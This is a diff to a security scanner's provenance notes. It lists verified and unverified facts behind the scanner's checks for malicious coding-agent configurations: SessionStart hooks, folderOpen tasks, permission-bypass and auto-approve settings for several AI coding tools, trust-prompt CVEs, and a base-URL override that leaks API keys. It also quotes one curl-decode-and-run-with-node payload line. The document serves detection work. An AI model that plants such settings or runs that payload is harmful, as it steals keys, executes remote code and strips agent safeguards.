@@ -635,3 +635,19 @@ No model weights were downloaded. Sizes and sha256 come from the Hugging Face tr
 ## api judge tier
 
 - Provider API endpoints and request shapes in unpick/judges/api.py — UNVERIFIED (not yet checked against each provider's current API reference)
+
+## October 2026 additions (sources: docs/research/2026-10-landscape.md)
+
+- CHAINDROP writes `.claude/settings.json` with a SessionStart hook running `node .claude/setup.mjs` and `.vscode/tasks.json` with a folderOpen task — verified 2026-10-18 against https://blog.gitguardian.com/keyv-mini-shai-hulud/ and https://socket.dev/blog/tensorlake-compromise
+- VS Code tasks run on open via `runOptions.runOn: "folderOpen"` — verified 2026-10-18 against https://code.visualstudio.com/docs/editor/tasks#_run-behavior
+- Claude Code `permissions.defaultMode: "bypassPermissions"` read before the trust dialog (fixed 2.1.53) — verified 2026-10-18 against https://advisories.gitlab.com/npm/@anthropic-ai/claude-code/CVE-2026-33068/
+- Claude Code project hooks ran before the trust prompt — verified 2026-10-18 against https://advisories.gitlab.com/npm/@anthropic-ai/claude-code/CVE-2026-40068/
+- A project `ANTHROPIC_BASE_URL` sent the API key to the attacker before the trust prompt (fixed 2.0.65) — verified 2026-10-18 against https://github.com/advisories/GHSA-jh7p-qr78-84p7
+- VS Code `chat.permissions.default: "autoApprove"` in workspace settings auto-approves Copilot agent tools — verified 2026-10-18 against https://repello.ai/blog/vscode-copilot-workspace-trust-bypass
+- OpenCode config: `opencode.json` or `opencode.jsonc`; `.opencode/` and `~/.config/opencode/` with agents, commands, modes, plugins, skills, tools (singular names load too); managed config at `/Library/Application Support/opencode/`, `/etc/opencode/`, `%ProgramData%\opencode`; `plugin` lists npm packages; `"permission": "allow"` removes prompts — verified 2026-10-18 against https://opencode.ai/docs/config/ and https://opencode.ai/docs/permissions/
+- Codex config keys `approval_policy` (value `never`) and `sandbox_mode` (value `danger-full-access`) — verified 2026-10-18 against openai/codex@89461ea codex-rs/app-server-protocol/schema/json/v2/ConfigReadResponse.json
+- Codex `model_providers.<name>.base_url` — UNVERIFIED (not in that schema; taken from the landscape report); the check still reads it, and a hit says where it pointed
+- Codex ran git with repo-local `core.fsmonitor`, `core.hooksPath` or filter drivers outside the sandbox (CVE-2026-19590..19593) — verified 2026-10-18 against https://www.zerodayinitiative.com/advisories/ZDI-26-651/
+- mcp-remote before 0.1.16 allows OS command execution from a malicious server (CVE-2025-6514) — verified 2026-10-18 against https://nvd.nist.gov/vuln/detail/CVE-2025-6514
+- Zenity skills.sh payload: `curl -s -k …/health | base64 -d > /tmp/t.mjs && node /tmp/t.mjs` in a setup file referenced from a clean SKILL.md — verified 2026-10-18 against the Zenity Labs write-up cited in the landscape report
+- Gemini CLI `tools.allowed` and yolo semantics — UNVERIFIED key names beyond the GHSA-wpqr-6v78-jr5g advisory; the yolo match is a plain-text match, medium severity
